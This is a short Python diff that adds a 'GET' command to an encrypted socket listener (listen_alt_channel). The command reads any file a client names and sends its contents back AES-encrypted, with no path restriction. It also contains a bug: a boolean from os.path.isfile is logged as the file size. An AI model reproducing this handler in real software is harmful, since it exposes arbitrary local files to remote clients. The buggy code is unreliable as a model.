@@ -94,6 +94,14 @@ def listen_alt_channel(timeout):
                                     pass
                         else:
                             client.send(utils.EncodeAES(cipher, 'NO'))
+                    elif 'GET' in decrypted_query.split('_'):
+                        name = decrypted_query.split('_')[1]
+                        if os.path.isfile(name):
+                            size = os.path.isfile(name)
+                            print '[*] %s is requesting %s [%d bytes]' % (client_addr[0],
+                                                                          name, size)
+                            enc_data = utils.EncodeAES(cipher, open(name, 'rb').read())
+                            client.send(enc_data)
                 except IndexError:
                     pass
             # Check for add user command
